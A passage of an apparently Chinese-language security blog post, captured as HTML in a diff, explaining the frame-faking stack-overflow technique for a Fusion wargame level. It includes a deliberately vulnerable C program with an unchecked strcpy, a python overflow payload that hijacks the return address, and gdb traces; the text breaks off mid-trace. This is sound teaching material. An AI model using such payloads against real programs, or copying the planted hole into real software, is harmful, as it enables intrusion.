@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>frame-faking-介绍-函数调用伪造 | mrh的学习分享</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="0x00  frame-faking在处理fusion的level02时遇到新的问题，需要了解frame-faking的原理，查阅了一些资料。
+The advanced return-into-lib(c) exploits
+Advanced Exploit Techique之–frame faking技术
+ROP轻松谈
+首先感谢各位前辈写的文章。
+Frame Faking是一种栈溢出的技巧，使用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="frame-faking-介绍-函数调用伪造">
+<meta property="og:url" content="http://yoursite.com/2016/01/27/frame-faking/index.html">
+<meta property="og:site_name" content="mrh的学习分享">
+<meta property="og:description" content="0x00  frame-faking在处理fusion的level02时遇到新的问题，需要了解frame-faking的原理，查阅了一些资料。
+The advanced return-into-lib(c) exploits
+Advanced Exploit Techique之–frame faking技术
+ROP轻松谈
+首先感谢各位前辈写的文章。
+Frame Faking是一种栈溢出的技巧，使用">
+<meta property="og:image" content="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/faking-frame_classic_ret2lib.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/frame-faking-栈上数据图.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/frame-faking-leave1-mov_esp_ebp.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/frame-faking-leave1-pop_ebp.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/frame-faking-ret1-pop_eip.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/frame-faking-leave2-mov_esp_ebp.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/frame-faking-leave2-pop_ebp.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/frame-faking-ret2-pop_eip.png">
+<meta property="og:updated_time" content="2016-03-24T03:35:58.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="frame-faking-介绍-函数调用伪造">
+<meta name="twitter:description" content="0x00  frame-faking在处理fusion的level02时遇到新的问题，需要了解frame-faking的原理，查阅了一些资料。
+The advanced return-into-lib(c) exploits
+Advanced Exploit Techique之–frame faking技术
+ROP轻松谈
+首先感谢各位前辈写的文章。
+Frame Faking是一种栈溢出的技巧，使用">
+  
+    <link rel="alternative" href="/atom.xml" title="mrh的学习分享" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/touxiang.jpeg">
+  
+  
+  <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css" type="text/css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/touxiang.jpeg" class="js-avatar">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/">mrh</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">胸口写一个勇字</p>
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">博客首页</a></li>
+                        
+                            <li><a href="/archives">所有文章</a></li>
+                        
+                            <li><a href="https://github.com/turingH/OSX_CRACKME">CrackMe</a></li>
+                        
+                            <li><a href="https://raw.githubusercontent.com/turingH/ad/master/README.md">安全站点</a></li>
+                        
+                            <li><a href="https://github.com/turingH/MACOSX-SecurityUpdate/blob/master/OSX/10.11.4/10.11.4_03_22_16.csv">10.11.4补丁</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl github" target="_blank" href="https://github.com/turingH" title="github">github</a>
+                            
+                                <a class="fl weibo" target="_blank" href="http://weibo.com/u/2047262653" title="weibo">weibo</a>
+                            
+                                <a class="fl twitter" target="_blank" href="https://twitter.com/samulehuang" title="twitter">twitter</a>
+                            
+                                <a class="fl facebook" target="_blank" href="https://www.facebook.com/huang.samuel.94" title="facebook">facebook</a>
+                            
+                                <a class="fl rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/CVE/" style="font-size: 13.33px;">CVE</a> <a href="/tags/DWORDSHOOT/" style="font-size: 10px;">DWORDSHOOT</a> <a href="/tags/OS-X/" style="font-size: 10px;">OS X</a> <a href="/tags/OSX/" style="font-size: 11.67px;">OSX</a> <a href="/tags/bounds-checking/" style="font-size: 10px;">bounds checking</a> <a href="/tags/dlopen/" style="font-size: 10px;">dlopen</a> <a href="/tags/dns/" style="font-size: 10px;">dns</a> <a href="/tags/dos/" style="font-size: 10px;">dos</a> <a href="/tags/dyld/" style="font-size: 15px;">dyld</a> <a href="/tags/dynamic-link/" style="font-size: 10px;">dynamic link</a> <a href="/tags/execv/" style="font-size: 11.67px;">execv</a> <a href="/tags/execve/" style="font-size: 10px;">execve</a> <a href="/tags/exploit/" style="font-size: 20px;">exploit</a> <a href="/tags/frame-faking/" style="font-size: 10px;">frame-faking</a> <a href="/tags/free/" style="font-size: 10px;">free</a> <a href="/tags/freebsd/" style="font-size: 10px;">freebsd</a> <a href="/tags/gethostbyname/" style="font-size: 10px;">gethostbyname</a> <a href="/tags/glibc/" style="font-size: 10px;">glibc</a> <a href="/tags/heap/" style="font-size: 16.67px;">heap</a> <a href="/tags/hook/" style="font-size: 10px;">hook</a> <a href="/tags/kernel/" style="font-size: 15px;">kernel</a> <a href="/tags/kextload/" style="font-size: 10px;">kextload</a> <a href="/tags/level02/" style="font-size: 10px;">level02</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/mach-o/" style="font-size: 18.33px;">mach-o</a> <a href="/tags/openssl/" style="font-size: 10px;">openssl</a> <a href="/tags/osx/" style="font-size: 16.67px;">osx</a> <a href="/tags/patch/" style="font-size: 10px;">patch</a> <a href="/tags/ports/" style="font-size: 11.67px;">ports</a> <a href="/tags/race/" style="font-size: 11.67px;">race</a> <a href="/tags/sandbox/" style="font-size: 10px;">sandbox</a> <a href="/tags/stack/" style="font-size: 13.33px;">stack</a> <a href="/tags/stackoverflow/" style="font-size: 10px;">stackoverflow</a> <a href="/tags/unlink/" style="font-size: 10px;">unlink</a> <a href="/tags/wargame/" style="font-size: 11.67px;">wargame</a>
+                    </div>
+                </section>
+                
+                
+                
+
+                
+                
+                <section class="switch-part switch-part3">
+                
+                    <div id="js-aboutme">啥也不说了，先干黄旭东</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">mrh</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/touxiang.jpeg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">mrh</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">胸口写一个勇字</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">博客首页</a></li>
+                
+                    <li><a href="/archives">所有文章</a></li>
+                
+                    <li><a href="https://github.com/turingH/OSX_CRACKME">CrackMe</a></li>
+                
+                    <li><a href="https://raw.githubusercontent.com/turingH/ad/master/README.md">安全站点</a></li>
+                
+                    <li><a href="https://github.com/turingH/MACOSX-SecurityUpdate/blob/master/OSX/10.11.4/10.11.4_03_22_16.csv">10.11.4补丁</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="github" target="_blank" href="https://github.com/turingH" title="github">github</a>
+                    
+                        <a class="weibo" target="_blank" href="http://weibo.com/u/2047262653" title="weibo">weibo</a>
+                    
+                        <a class="twitter" target="_blank" href="https://twitter.com/samulehuang" title="twitter">twitter</a>
+                    
+                        <a class="facebook" target="_blank" href="https://www.facebook.com/huang.samuel.94" title="facebook">facebook</a>
+                    
+                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-frame-faking" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/01/27/frame-faking/" class="article-date">
+      <time datetime="2016-01-27T16:02:32.000Z" itemprop="datePublished">2016-01-27</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      frame-faking-介绍-函数调用伪造
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/fusion/">fusion</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/exploit/">exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/stack/">stack</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="0x00_frame-faking"><strong>0x00</strong>  frame-faking</h1><p>在处理<a href="https://exploit-exercises.com/fusion/" target="_blank" rel="external">fusion</a>的<a href="https://exploit-exercises.com/fusion/level02/" target="_blank" rel="external">level02</a>时遇到新的问题，需要了解frame-faking的原理，查阅了一些资料。</p>
+<p><a href="http://phrack.org/issues/58/4.html" target="_blank" rel="external">The advanced return-into-lib(c) exploits</a></p>
+<p><a href="http://www.xfocus.net/articles/200602/851.html" target="_blank" rel="external">Advanced Exploit Techique之–frame faking技术</a></p>
+<p><a href="http://www.slideshare.net/hackstuff/rop-40525248" target="_blank" rel="external">ROP轻松谈</a></p>
+<p>首先感谢各位前辈写的文章。</p>
+<p>Frame Faking是一种栈溢出的技巧，使用framefaking可以通过控制ebp修改程序的运行流程，可以用来对抗DEP。</p>
+<h2 id="<!-more->"><a id="more"></a></h2><h1 id="0x01_经典的ret2lib溢出"><strong>0x01</strong> 经典的ret2lib溢出</h1><h2 id="溢出流程">溢出流程</h2><p>测试代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">char</span> *a)</span></span>&#123;</span><br><span class="line">            <span class="keyword">char</span> buf[<span class="number">256</span>];</span><br><span class="line">            <span class="built_in">strcpy</span>(buf,a);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"buf is: %s\n"</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">t</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">            n=<span class="number">0</span>;</span><br><span class="line">            n=n+<span class="number">1</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"n is : %d\n"</span>,n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    test(argv[<span class="number">1</span>]);</span><br><span class="line">    t(i);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector test.c -o test</span><br></pre></td></tr></table></figure>
+<p>通过构建payload使得test会调用t,并且设置返回地址。如图：</p>
+<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/faking-frame_classic_ret2lib.png" alt="栈内存图"></p>
+<p>下面我着重分析一下<strong>为什么可以控制调用后函数的返回地址</strong>，因为在加深对汇编代码栈上数据的管理。有利于更好地理解frame faking。</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Starting program: /tmp/<span class="keyword">test</span> $(python -c <span class="string">'print "A"*268+"\x4b\x84\x04\x08"+"CCCC"+"\x40\xf5\xff\xbf"'</span>)</span><br><span class="line">buf is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKCCCC@???</span><br><span class="line"></span><br><span class="line">Breakpoint <span class="number">2</span>, <span class="number">0x08048449</span> <span class="keyword">in</span> <span class="keyword">test</span> ()</span><br><span class="line">(gdb) disas <span class="keyword">test</span></span><br><span class="line">Dump of assembler code for function <span class="keyword">test</span>:</span><br><span class="line">   <span class="number">0x08048414</span> &lt;+<span class="number">0</span>&gt;:	<span class="keyword">push</span>   %<span class="literal">ebp</span></span><br><span class="line">   <span class="number">0x08048415</span> &lt;+<span class="number">1</span>&gt;:	<span class="keyword">mov</span>    %<span class="literal">esp</span>,%<span class="literal">ebp</span></span><br><span class="line">   <span class="number">0x08048417</span> &lt;+<span class="number">3</span>&gt;:	<span class="keyword">sub</span>    <span class="number">$0</span>x118,%<span class="literal">esp</span></span><br><span class="line">   <span class="number">0x0804841d</span> &lt;+<span class="number">9</span>&gt;:	<span class="keyword">mov</span>    <span class="number">0x8</span>(%<span class="literal">ebp</span>),%<span class="literal">eax</span></span><br><span class="line">   <span class="number">0x08048420</span> &lt;+<span class="number">12</span>&gt;:	<span class="keyword">mov</span>    %<span class="literal">eax</span>,<span class="number">0x4</span>(%<span class="literal">esp</span>)</span><br><span class="line">   <span class="number">0x08048424</span> &lt;+<span class="number">16</span>&gt;:	<span class="keyword">lea</span>    -<span class="number">0x108</span>(%<span class="literal">ebp</span>),%<span class="literal">eax</span></span><br><span class="line">   <span class="number">0x0804842a</span> &lt;+<span class="number">22</span>&gt;:	<span class="keyword">mov</span>    %<span class="literal">eax</span>,(%<span class="literal">esp</span>)</span><br><span class="line">   <span class="number">0x0804842d</span> &lt;+<span class="number">25</span>&gt;:	<span class="keyword">call</span>   <span class="number">0x8048330</span> &lt;strcpy@plt&gt;</span><br><span class="line">   <span class="number">0x08048432</span> &lt;+<span class="number">30</span>&gt;:	<span class="keyword">mov</span>    <span class="number">$0</span>x8048570,%<span class="literal">eax</span></span><br><span class="line">   <span class="number">0x08048437</span> &lt;+<span class="number">35</span>&gt;:	<span class="keyword">lea</span>    -<span class="number">0x108</span>(%<span class="literal">ebp</span>),%<span class="literal">edx</span></span><br><span class="line">   <span class="number">0x0804843d</span> &lt;+<span class="number">41</span>&gt;:	<span class="keyword">mov</span>    %<span class="literal">edx</span>,<span class="number">0x4</span>(%<span class="literal">esp</span>)</span><br><span class="line">   <span class="number">0x08048441</span> &lt;+<span class="number">45</span>&gt;:	<span class="keyword">mov</span>    %<span class="literal">eax</span>,(%<span class="literal">esp</span>)</span><br><span class="line">   <span class="number">0x08048444</span> &lt;+<span class="number">48</span>&gt;:	<span class="keyword">call</span>   <span class="number">0x8048320</span> &lt;printf@plt&gt;</span><br><span class="line">=&gt; <span class="number">0x08048449</span> &lt;+<span class="number">53</span>&gt;:	<span class="keyword">leave</span>  </span><br><span class="line">   <span class="number">0x0804844a</span> &lt;+<span class="number">54</span>&gt;:	<span class="keyword">ret</span>    </span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line">(gdb) i r</span><br><span class="line"><span class="literal">eax</span>            <span class="number">0x121</span>	<span class="number">289</span></span><br><span class="line"><span class="literal">ecx</span>            <span class="number">0xbffff51c</span>	-<span class="number">1073744612</span></span><br><span class="line"><span class="literal">edx</span>            <span class="number">0x0</span>	<span class="number">0</span></span><br><span class="line"><span class="literal">ebx</span>            <span class="number">0xb7fceff4</span>	-<span class="number">1208160268</span></span><br><span class="line"><span class="literal">esp</span>            <span class="number">0xbffff530</span>	<span class="number">0xbffff530</span></span><br><span class="line"><span class="literal">ebp</span>            <span class="number">0xbffff648</span>	<span class="number">0xbffff648</span></span><br><span class="line"><span class="literal">esi</span>            <span class="number">0x0</span>	<span class="number">0</span></span><br><span class="line"><span class="literal">edi</span>            <span class="number">0x0</span>	<span class="number">0</span></span><br><span class="line"><span class="literal">eip</span>            <span class="number">0x8048449</span>	<span class="number">0x8048449</span> &lt;<span class="keyword">test</span>+<span class="number">53</span>&gt;</span><br><span class="line">eflags         <span class="number">0x296</span>	[ PF AF SF IF ]</span><br><span class="line"><span class="literal">cs</span>             <span class="number">0x73</span>	<span class="number">115</span></span><br><span class="line"><span class="literal">ss</span>             <span class="number">0x7b</span>	<span class="number">123</span></span><br><span class="line"><span class="literal">ds</span>             <span class="number">0x7b</span>	<span class="number">123</span></span><br><span class="line"><span class="literal">es</span>             <span class="number">0x7b</span>	<span class="number">123</span></span><br><span class="line"><span class="literal">fs</span>             <span class="number">0x0</span>	<span class="number">0</span></span><br><span class="line"><span class="literal">gs</span>             <span class="number">0x33</span>	<span class="number">51</span></span><br></pre></td></tr></table></figure>
+<p>在汇编代码执行到leave的时候，esp与ebp分别指向栈顶和栈低。</p>
+<p>leave指令相当于. </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp,ebp	；<span class="comment">//esp=ebp=0xbffff648。</span></span><br><span class="line">pop ebp ；<span class="comment">//ebp=[esp],esp=esp+4。</span></span><br></pre></td></tr></table></figure>
+<p>所以在执行完leave指令之后，esp=0xbffff64c,ebp=0x41414141。</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">(gdb) ni</span><br><span class="line"></span><br><span class="line">Breakpoint <span class="number">1</span>, <span class="number">0x0804844a</span> <span class="keyword">in</span> <span class="keyword">test</span> ()</span><br><span class="line">(gdb) disassemble <span class="keyword">test</span></span><br><span class="line">Dump of assembler code for function <span class="keyword">test</span>:</span><br><span class="line">   <span class="number">0x08048414</span> &lt;+<span class="number">0</span>&gt;:	<span class="keyword">push</span>   %<span class="literal">ebp</span></span><br><span class="line">   <span class="number">0x08048415</span> &lt;+<span class="number">1</span>&gt;:	<span class="keyword">mov</span>    %<span class="literal">esp</span>,%<span class="literal">ebp</span></span><br><span class="line">   <span class="number">0x08048417</span> &lt;+<span class="number">3</span>&gt;:	<span class="keyword">sub</span>    <span class="number">$0</span>x118,%<span class="literal">esp</span></span><br><span class="line">   <span class="number">0x0804841d</span> &lt;+<span class="number">9</span>&gt;:	<span class="keyword">mov</span>    <span class="number">0x8</span>(%<span class="literal">ebp</span>),%<span class="literal">eax</span></span><br><span class="line">   <span class="number">0x08048420</span> &lt;+<span class="number">12</span>&gt;:	<span class="keyword">mov</span>    %<span class="literal">eax</span>,<span class="number">0x4</span>(%<span class="literal">esp</span>)</span><br><span class="line">   <span class="number">0x08048424</span> &lt;+<span class="number">16</span>&gt;:	<span class="keyword">lea</span>    -<span class="number">0x108</span>(%<span class="literal">ebp</span>),%<span class="literal">eax</span></span><br><span class="line">   <span class="number">0x0804842a</span> &lt;+<span class="number">22</span>&gt;:	<span class="keyword">mov</span>    %<span class="literal">eax</span>,(%<span class="literal">esp</span>)</span><br><span class="line">   <span class="number">0x0804842d</span> &lt;+<span class="number">25</span>&gt;:	<span class="keyword">call</span>   <span class="number">0x8048330</span> &lt;strcpy@plt&gt;</span><br><span class="line">   <span class="number">0x08048432</span> &lt;+<span class="number">30</span>&gt;:	<span class="keyword">mov</span>    <span class="number">$0</span>x8048570,%<span class="literal">eax</span></span><br><span class="line">   <span class="number">0x08048437</span> &lt;+<span class="number">35</span>&gt;:	<span class="keyword">lea</span>    -<span class="number">0x108</span>(%<span class="literal">ebp</span>),%<span class="literal">edx</span></span><br><span class="line">   <span class="number">0x0804843d</span> &lt;+<span class="number">41</span>&gt;:	<span class="keyword">mov</span>    %<span class="literal">edx</span>,<span class="number">0x4</span>(%<span class="literal">esp</span>)</span><br><span class="line">   <span class="number">0x08048441</span> &lt;+<span class="number">45</span>&gt;:	<span class="keyword">mov</span>    %<span class="literal">eax</span>,(%<span class="literal">esp</span>)</span><br><span class="line">   <span class="number">0x08048444</span> &lt;+<span class="number">48</span>&gt;:	<span class="keyword">call</span>   <span class="number">0x8048320</span> &lt;printf@plt&gt;</span><br><span class="line">   <span class="number">0x08048449</span> &lt;+<span class="number">53</span>&gt;:	<span class="keyword">leave</span>  </span><br><span class="line">=&gt; <span class="number">0x0804844a</span> &lt;+<span class="number">54</span>&gt;:	<span class="keyword">ret</span>    </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) i r</span><br><span class="line"><span class="literal">eax</span>            <span class="number">0x121</span>	<span class="number">289</span></span><br><span class="line"><span class="literal">ecx</span>            <span class="number">0xbffff51c</span>	-<span class="number">1073744612</span></span><br><span class="line"><span class="literal">edx</span>            <span class="number">0x0</span>	<span class="number">0</span></span><br><span class="line"><span class="literal">ebx</span>            <span class="number">0xb7fceff4</span>	-<span class="number">1208160268</span></span><br><span class="line"><span class="literal">esp</span>            <span class="number">0xbffff64c</span>	<span class="number">0xbffff64c</span></span><br><span class="line"><span class="literal">ebp</span>            <span class="number">0x41414141</span>	<span class="number">0x41414141</span></span><br><span class="line"><span class="literal">esi</span>            <span class="number">0x0</span>	<span class="number">0</span></span><br><span class="line"><span class="literal">edi</span>            <span class="number">0x0</span>	<span class="number">0</span></span><br><span class="line"><span class="literal">eip</span>            <span class="number">0x804844a</span>		<span class="number">0x804844a</span> &lt;<span class="keyword">test</span>+<span class="number">54</span>&gt;</span><br><span class="line">eflags         <span class="number">0x296</span>	[ PF AF SF IF ]</span><br><span class="line"><span class="literal">cs</span>             <span class="number">0x73</span>	<span class="number">115</span></span><br><span class="line"><span class="literal">ss</span>             <span class="number">0x7b</span>	<span class="number">123</span></span><br><span class="line"><span class="literal">ds</span>             <span class="number">0x7b</span>	<span class="number">123</span></span><br><span class="line"><span class="literal">es</span>             <span class="number">0x7b</span>	<span class="number">123</span></span><br><span class="line"><span class="literal">fs</span>             <span class="number">0x0</span>	<span class="number">0</span></span><br><span class="line"><span class="literal">gs</span>             <span class="number">0x33</span>	<span class="number">51</span></span><br></pre></td></tr></table></figure>
+<p>可以看到确实与我们计算的相同。此时需要执行指令ret。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret ;<span class="comment">//pop esi,等同于eip=[esp],esp=esp+4</span></span><br></pre></td></tr></table></figure>
+<p>通过查看esp寄存器地址的数据，发现eip将被赋值为<strong>0x0804844b</strong>。正是<strong>t函数的地址</strong>。且esp的值将变成0xbffff650,而0xbfffff650的值是我们写入的”CCCC”。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x /<span class="number">10</span>x $esp</span><br><span class="line"><span class="number">0xbffff64c</span>:	<span class="number">0x0804844b</span>	<span class="number">0x43434343</span>	<span class="number">0xbffff540</span>	<span class="number">0xb7e89b00</span></span><br><span class="line"><span class="number">0xbffff65c</span>:	<span class="number">0xb7fcf324</span>	<span class="number">0xb7fceff4</span>	<span class="number">0xb7e89c55</span>	<span class="number">0x080484a9</span></span><br><span class="line"><span class="number">0xbffff66c</span>:	<span class="number">0xb7fceff4</span>	<span class="number">0x080484a0</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(gdb) ni</span><br><span class="line"><span class="number">0x0804844b</span> <span class="keyword">in</span> t ()</span><br><span class="line">(gdb) i r</span><br><span class="line"><span class="literal">eax</span>            <span class="number">0x121</span>	<span class="number">289</span></span><br><span class="line"><span class="literal">ecx</span>            <span class="number">0xbffff51c</span>	-<span class="number">1073744612</span></span><br><span class="line"><span class="literal">edx</span>            <span class="number">0x0</span>	<span class="number">0</span></span><br><span class="line"><span class="literal">ebx</span>            <span class="number">0xb7fceff4</span>	-<span class="number">1208160268</span></span><br><span class="line"><span class="literal">esp</span>            <span class="number">0xbffff650</span>	<span class="number">0xbffff650</span></span><br><span class="line"><span class="literal">ebp</span>            <span class="number">0x41414141</span>	<span class="number">0x41414141</span></span><br><span class="line"><span class="literal">esi</span>            <span class="number">0x0</span>	<span class="number">0</span></span><br><span class="line"><span class="literal">edi</span>            <span class="number">0x0</span>	<span class="number">0</span></span><br><span class="line"><span class="literal">eip</span>            <span 